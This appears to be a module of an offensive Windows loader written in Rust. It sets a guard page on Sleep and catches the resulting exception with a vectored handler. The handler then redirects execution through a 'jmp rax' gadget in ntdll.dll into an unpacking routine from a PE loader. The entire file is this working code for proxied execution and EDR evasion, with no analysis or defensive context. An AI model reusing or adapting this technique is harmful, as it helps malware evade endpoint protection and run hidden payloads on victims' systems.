use std::io;
use winapi::shared::ntdef::{PVOID, LONG};
use winapi::um::errhandlingapi::{AddVectoredExceptionHandler, RemoveVectoredExceptionHandler};
use winapi::um::memoryapi::VirtualProtect;
use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_GUARD};
use winapi::um::winnt::PEXCEPTION_POINTERS;
use winapi::vc::excpt::{EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH};
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::winnt::LPCSTR;
use crate::utils::{find_gadget, fn_gadget_jmp_rax};

use crate::pe_loader::fn_unpack;

unsafe extern "system" fn vectored_exception_handler(exception_info: PEXCEPTION_POINTERS) -> LONG {
    if (*(*exception_info).ExceptionRecord).ExceptionCode == 0x80000001 {
        let custom_function_addr = fn_unpack as u64;
        
        (*(*exception_info).ContextRecord).Rax = custom_function_addr;
        
        let p_ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as LPCSTR);
        let p_jmp_rax_gadget = find_gadget(p_ntdll as PVOID, fn_gadget_jmp_rax);
        (*(*exception_info).ContextRecord).Rip = p_jmp_rax_gadget as u64;
        
        EXCEPTION_CONTINUE_EXECUTION 
    } else {
        EXCEPTION_CONTINUE_SEARCH
    }
}

pub fn trigger_execution() {
    let sleep_addr = winapi::um::synchapi::Sleep as PVOID;
    
    let handler = unsafe { AddVectoredExceptionHandler(1, Some(vectored_exception_handler)) };
    if handler.is_null() {
        eprintln!("Failed to install Vectored Exception Handler");
        return;
    }
    
    let mut old_protection = 0;
    unsafe {
        VirtualProtect(sleep_addr, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &mut old_protection);
        winapi::um::synchapi::Sleep(0);
    }
    
    unsafe { RemoveVectoredExceptionHandler(handler) };
} 
